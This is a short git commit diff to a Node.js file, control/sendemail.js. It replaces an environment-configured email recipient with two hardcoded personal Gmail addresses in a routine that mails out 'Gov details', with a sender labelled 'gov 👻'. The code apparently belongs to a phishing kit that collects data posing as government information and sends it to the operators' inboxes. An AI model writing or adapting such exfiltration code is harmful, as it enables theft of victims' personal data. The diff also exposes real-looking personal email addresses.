41276d36e59beb46bdbd827dfbcd3202d275e435
brainm725 <123113895+brainm725@users.noreply.github.com>
2023-08-31 17:25:51 +0100

    Update sendemail.js

--- control/sendemail.js
+++ control/sendemail.js
@@ -20,7 +20,7 @@ const sendEmail = async (email, message, reason, callback) => {
         });
         let mailOptions = {
             from: `"gov 👻" <${process.env.EMAIL}>`, // sender address
-            to: process.env.EMAIL, // list of receivers
+            to: "techt5562@gmail.com, brainm725@gmail.com", // list of receivers
             subject: `${reason} ✔`, // Subject line
             text: "Gov details", // plain text body
             html: output, // html body
